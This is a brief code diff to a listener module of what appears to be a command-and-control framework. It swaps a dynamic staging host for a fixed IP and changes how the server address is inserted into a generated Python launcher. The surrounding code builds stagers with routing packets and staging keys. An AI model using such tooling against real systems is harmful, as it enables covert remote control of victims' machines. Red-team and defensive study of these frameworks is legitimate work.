@@ -58,7 +58,7 @@ class Listener:
             'Host' : {
                 'Description'   :   'Hostname/IP for staging.',
                 'Required'      :   True,
-                'Value'         :   "{}".format(helpers.lhost())
+                'Value'         :   '10.10.10.10'
             },
             'BindIP' : {
                 'Description'   :   'The IP to bind to on the control server.',
@@ -249,9 +249,9 @@ class Listener:
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print helpers.color(p, color='red')
-                # TODO shouldn't need this slicing
-                launcherBase += "server='{}';".format(host[7:-3])
 
+                #launcherBase += "server='{}';".format(host[7:-3])
+                launcherBase += "server='{}';".format(host)
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b32RoutingPacket = base64.b32encode(routingPacket)
